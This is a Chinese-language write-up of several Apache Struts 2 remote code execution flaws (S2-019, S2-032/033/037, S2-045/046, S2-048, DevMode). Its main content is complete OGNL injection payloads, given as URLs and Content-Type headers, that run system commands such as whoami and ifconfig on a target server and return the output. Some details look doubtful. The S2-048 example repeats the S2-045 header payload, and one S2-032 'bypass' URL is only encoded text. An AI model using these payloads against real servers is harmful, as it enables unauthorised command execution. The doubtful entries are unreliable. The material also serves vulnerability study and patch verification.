# Struts 2 漏洞分析与利用

本文档详细介绍了多个Struts 2框架中的安全漏洞，并提供了相应的利用方法。以下是对每个漏洞的清晰、连贯和专业的描述。

## S2-019
### 影响版本
- Struts 2.0.0 – Struts 2.3.15.1
- 自Struts 2.3.15.2起，默认关闭开发模式，但该措施并不完全有效。

### 利用示例
```http
http://x.x.x.x/x.action?debug=command&expression=#f=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#f.setAccessible(true),#f.set(#_memberAccess,true),#req=@org.apache.struts2.ServletActionContext@getRequest(),#resp=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#a=(new java.lang.ProcessBuilder(new java.lang.String[]{'whoami'})).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[1000],#d.read(#e),#resp.println(#e),#resp.close()
```

## S2-032, S2-033, S2-037
### 影响版本
- 2.3.18 - 2.3.28 (除2.3.20.2 和 2.3.24.2)

#### S2-032
当动态方法调用开启时，可以通过特定URL绕过特殊字符限制并执行任意代码。
- 示例：
  ```http
  http://localhost:8080/struts241/index!login.action
  ```
- 绕过限制：
  ```http
  http://localhost:8080/struts241/index.action?method:login%C0%B4%C8%C6%B9%FD%CE%DE%B7%A8%B4%AB%C8%EB%CC%D8%CA%E2%D7%D6%B7%FB%B5%C4%CF%DE%D6%C6
  ```

#### S2-033
依赖于S2-032漏洞，当同时使用Struts2 REST插件时，可以利用“!”操作符调用动态方法并执行OGNL表达式。
- 示例：
  ```http
  http://localhost:8080/struts2-rest-showcase-280/orders/3!%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,@java.lang.Runtime@getRuntime%28%29.exec%28%23parameters.command[0]),%23xx%3d123,%23xx.toString.json?&command=calc.exe
  ```

#### S2-037
同样依赖于S2-032，即使未配置`struts.enable.DynamicMethodInvocation`为`true`，通过Struts2 REST插件仍可触发此漏洞。
- 示例：
  ```http
  http://localhost:8080/struts2-rest-showcase-280/orders/3/%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,@java.lang.Runtime@getRuntime%28%29.exec%28%23parameters.command[0]),%23xx%3d123,%23xx.toString.json?&command=calc.exe
  ```

## S2-045, S2-046
### 影响版本
- Struts 2.3.5 – Struts 2.3.31
- Struts 2.5 – Struts 2.5.10

#### S2-045
由于对错误消息处理不当，攻击者可通过`Content-Type`头注入OGNL语言执行命令。
- 示例：
  ```http
  Content-Type：%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='ifconfig').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
  ```

#### S2-046
与S2-045类似，但利用恶意的`Content-Disposition`值或不合适的`Content-Length`头来触发远程命令执行。

## S2-048
### 影响版本
- Apache Struts 2.3.x系列中启用了`struts2-struts1-plugin`插件的版本

该漏洞主要存在于`Struts1Action.java`文件中的`execute`函数，通过控制`getText()`函数的参数输入点，可以构造恶意代码实现RCE攻击。
- 示例：
  ```http
  Content-Type:%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
  ```

## DevMode (S2-008)
### 影响版本
- Struts 2.1.0–2.5.1

在开发模式下存在一个远程执行漏洞，尽管后续版本增加了过滤处理，但直到2.3.28之前的版本都可能受到影响。
- 示例：
  ```http
  http://localhost:8080/test02/Login.action?debug=command&expression=%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d%3dfalse%2c%23f%3d%23_memberAccess.getClass%28%29.getDeclaredField%28%22allowStaticMethodAccess%22%29%2c%23f.setAccessible%28true%29%2c%23f.set%28%23_memberAccess%2ctrue%29%2c%23a%3d@java.lang.Runtime@getRuntime%28%29.exec%28%22whoami%22%29.getInputStream%28%29%2c%23b%3dnew java.io.InputStreamReader%28%23a%29%2c%23c%3dnew java.io.BufferedReader%28%23b%29%2c%23d%3dnew char%5b50000%5d%2c%23c.read%28%23d%29%2c%23genxor%3d%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%2c%23genxor.println%28%23d%29%2c%23genxor.flush%28%29%2c%23genxor.close%28%29
  ```

## 参考资料
1. [参考资料1]
2. [参考资料2](http://netsecurity.51cto.com/art/201707/544837.htm)
3. [参考资料3](https://www.seebug.org/vuldb/ssvid-92088)
4. [参考资料4](https://www.waitalone.cn/struts2-command-exp.html)
5. [参考资料5](https://cwiki.apache.org/confluence/display/WW/S2-009)
6. [参考资料6](http://www.cnblogs.com/shellr00t/p/5721558.html)